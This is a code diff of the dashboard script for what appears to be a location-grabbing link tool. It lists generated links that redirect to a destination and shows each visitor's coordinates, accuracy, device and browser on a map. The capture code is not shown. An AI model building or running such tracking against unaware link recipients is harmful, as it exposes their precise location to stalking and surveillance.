+/* On mobile: select link AND switch to hits tab */
+function selectLinkMob(id) {
+  selectLink(id);
+  if (isMobile()) mobSwitch('main');
 }
 
-function copyGenLink() {
-  navigator.clipboard.writeText(document.getElementById('genLink').textContent)
-    .then(() => { const b=document.querySelector('.btn-copy'); b.textContent='Copied!'; setTimeout(()=>b.textContent='Copy Link',2000); });
-}
-
-// ── Select & view link ────────────────────────────────────────────────
+/* ── Select link & poll ─────────────────────────────────────────── */
 function selectLink(id) {
   activeLinkId = id;
   if (pollTimer) clearInterval(pollTimer);
   fetchAndRender(id);
   pollTimer = setInterval(() => fetchAndRender(id), 4000);
-  loadLinks();
+  document.querySelectorAll('.link-card').forEach(c => {
+    c.classList.toggle('active', c.getAttribute('onclick')?.includes(`'${id}'`));
+  });
 }
 
 async function fetchAndRender(id) {
-  const data = await fetch(`/api/links/${id}/hits`).then(r=>r.json()).catch(()=>null);
-  if (!data) return;
+  try {
+    const data = await apiFetch(`/api/links/${id}/hits`);
+    renderHits(data);
+  } catch(e) {
+    if (e.message === 'Not found') {
+      document.getElementById('mainBody').innerHTML = '<div class="no-hits-msg">Link not found.</div>';
+    }
+  }
+}
 
+function renderHits(data) {
   const expired = new Date(data.expiresAt) < new Date();
-  const domain = getDomain(data.dest);
-
-  document.getElementById('mainTitle').textContent = domain;
-  document.getElementById('mainSub').textContent = `→ ${data.dest}`;
+  document.getElementById('mainTitle').textContent = getDomain(data.dest);
+  document.getElementById('mainSub').textContent = '→ ' + data.dest;
   document.getElementById('liveBadge').style.display = expired ? 'none' : 'flex';
 
-  let html = '';
-
-  // Expiry bar
-  html += `<div class="expiry-bar ${expired?'dead':'live'}">
-    ${expired
-      ? `🔴 Link expired on ${fmtDate(data.expiresAt)}`
-      : `🟢 Active — expires ${formatExpiry(data.expiresAt)}`}
+  let html = `<div class="expiry-bar ${expired?'dead-bar':'live-bar'}">
+    ${expired ? '🔴 Expired ' + fmtDate(data.expiresAt) : '🟢 Active — ' + formatExpiry(data.expiresAt)}
   </div>`;
 
-  const hits = data.hits;
-
+  const hits = data.hits || [];
   if (!hits.length) {
     html += '<div class="no-hits-msg">Waiting for someone to open the link…</div>';
   } else {
-    // Map
-    html += '<div class="section-label">Location Map</div>';
-    html += '<div class="map-wrap"><div id="map"></div></div>';
-    html += `<div class="section-label">${hits.length} Hit${hits!==1?'s':''} Received</div>`;
+    const valid = hits.filter(h => h.lat && h.lon);
+    if (valid.length) {
+      html += '<div class="section-label">Location Map</div><div class="map-wrap"><div id="map"></div></div>';
+    }
+    html += `<div class="section-label">${hits.length} Hit${hits.length!==1?'s':''} Received</div>`;
     html += '<div class="hits-grid">';
     [...hits].reverse().forEach((h, i) => {
-      html += `<div class="hit-card">
-        <div class="hit-num">Hit #${hits.length - i}</div>
+      html += `<div class="hit-card" style="animation-delay:${i*0.05}s">
+        <div class="hit-num">Hit #${hits.length-i}</div>
         <div class="hit-row"><span class="hk">Latitude</span><span class="hv green">${h.lat ?? '—'}</span></div>
         <div class="hit-row"><span class="hk">Longitude</span><span class="hv green">${h.lon ?? '—'}</span></div>
         <div class="hit-row"><span class="hk">Accuracy</span><span class="hv">${h.acc ? h.acc+'m' : '—'}</span></div>
-        <div class="hit-row"><span class="hk">Device</span><span class="hv blue">${h.device}</span></div>
-        <div class="hit-row"><span class="hk">Browser</span><span class="hv">${h.browser}</span></div>
+        <div class="hit-row"><span class="hk">Device</span><span class="hv blue">${esc(h.device||'—')}</span></div>
+        <div class="hit-row"><span class="hk">Browser</span><span class="hv">${esc(h.browser||'—')}</span></div>
         <div class="hit-row"><span class="hk">Time</span><span class="hv">${fmtDate(h.time)}</span></div>
-        ${h.lat&&h.lon?`<a class="map-link" href="https://maps.google.com/?q=${h.lat},${h.lon}" target="_blank">🗺 Open in Maps</a>`:''}
+        ${h.lat&&h.lon ? `<a class="map-link" href="https://maps.google.com/?q=${h.lat},${h.lon}" target="_blank" rel="noopener">🗺 Maps</a>` : ''}
       </div>`;
     });
     html += '</div>';
@@ -309,66 +516,60 @@ async function fetchAndRender(id) {
 
   document.getElementById('mainBody').innerHTML = html;
 
-  // Init Leaflet map
-  if (hits.length) {
-    const validHits = hits.filter(h => h.lat && h.lon);
-    if (validHits.length) {
-      setTimeout(() => {
-        if (mapInstance) { mapInstance.remove(); mapInstance = null; }
-        mapInstance = L.map('map', { zoomControl: true });
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-          attribution: '©OSM ©Carto', maxZoom: 18
-        }).addTo(mapInstance);
-
-        const bounds = [];
-        validHits.forEach((h, i) => {
-          const marker = L.circleMarker([h.lat, h.lon], {
-            radius: 8, fillColor: '#00ff88', color: '#000',
-            weight: 2, opacity: 1, fillOpacity: 0.85
-          }).addTo(mapInstance)
-            .bindPopup(`<b>Hit #${i+1}</b><br>${h.lat}, ${h.lon}<br>${h.device} / ${h.browser}<br>${fmtDate(h.time)}`);
-          bounds.push([h.lat, h.lon]);
-        });
-        if (bounds.length === 1) mapInstance.setView(bounds[0], 13);
-        else mapInstance.fitBounds(bounds, { padding: [30, 30] });
-      }, 100);
-    }
+  const validHits = (data.hits||[]).filter(h=>h.lat&&h.lon);
+  if (validHits.length) {
+    setTimeout(() => {
+      const mapEl = document.getElementById('map');
+      if (!mapEl) return;
+      if (mapInstance) { mapInstance.remove(); mapInstance = null; }
+      mapInstance = L.map('map', { zoomControl: true });
+      L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+        attribution:'©OSM ©Carto', maxZoom:18
+      }).addTo(mapInstance);
+      const bounds = [];
+      validHits.forEach((h, i) => {
+        L.circleMarker([h.lat,h.lon], { radius:8, fillColor:'#00ff88', color:'#000', weight:2, opacity:1, fillOpacity:.85 })
+          .addTo(mapInstance)
+          .bindPopup(`<b>Hit #${i+1}</b><br>${h.lat}, ${h.lon}<br>${h.device}/${h.browser}`);
+        bounds.push([h.lat,h.lon]);
+      });
+      bounds.length===1 ? mapInstance.setView(bounds[0],13) : mapInstance.fitBounds(bounds,{padding:[20,20]});
+    }, 80);
   }
 }
 
 async function deleteLink(e, id) {
   e.stopPropagation();
-  if (!confirm('Delete this link?')) return;
-  await fetch(`/api/links/${id}`, { method: 'DELETE' });
-  if (activeLinkId === id) {
-    activeLinkId = null;
-    if (pollTimer) clearInterval(pollTimer);
-    document.getElementById('mainBody').innerHTML = '<div class="no-select"><div class="icon">📍</div><p>Select a generated link<br>to view incoming locations</p></div>';
-    document.getElementById('mainTitle').textContent = 'Select a link';
-    document.getElementById('mainSub').textContent = 'Click any link from the sidebar to view hits';
-    document.getElementById('liveBadge').style.display = 'none';
-  }
-  loadLinks();
+  if (!confirm('Delete this link and all its data?')) return;
+  try {
+    await apiFetch(`/api/links/${id}`, { method:'DELETE' });
+    if (activeLinkId === id) {
+      activeLinkId = null;
+      if (pollTimer) clearInterval(pollTimer);
+      document.getElementById('mainBody').innerHTML = '<div class="no-select"><div class="icon">📍</div><p>Select a link</p></div>';
+      document.getElementById('mainTitle').textContent = 'Select a link';
+      document.getElementById('mainSub').textContent = 'Choose a link from the sidebar';
+      document.getElementById('liveBadge').style.display = 'none';
+    }
+    toast('Link deleted');
+    loadLinks();
+  } catch(e) { toast(e.message, 'error'); }
 }
 
-// ── Helpers ───────────────────────────────────────────────────────────
-function getDomain(url) {
-  try { return new URL(url).hostname; } catch(e) { return url; }
-}
-
+/* ── Helpers ────────────────────────────────────────────────────── */
+function getDomain(url) { try { return new URL(url).hostname; } catch(e) { return url; } }
+function esc(s) { return String(s||'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
 function fmtDate(iso) {
   const d = new Date(iso);
-  return d.toLocaleDateString('en-IN', { day:'2-digit', month:'short' }) + ' ' +
-    d.toLocaleTimeString('en-IN', { hour:'2-digit', minute:'2-digit' });
+  return d.toLocaleDateString('en-IN',{day:'2-digit',month:'short'}) + ' ' +
+    d.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'});
 }
-
 function formatExpiry(iso) {
   const diff = new Date(iso) - new Date();
   if (diff <= 0) return 'Expired';
-  const h = Math.floor(diff / 3600000);
-  const m = Math.floor((diff % 3600000) / 60000);
-  if (h > 0) return `in ${h}h ${m}m`;
-  return `in ${m}m`;
+  const h = Math.floor(diff/3600000);
+  const m = Math.floor((diff%3600000)/60000);
+  return h > 0 ? `in ${h}h ${m}m` : `in ${m}m`;
 }
 </script>
 </body>
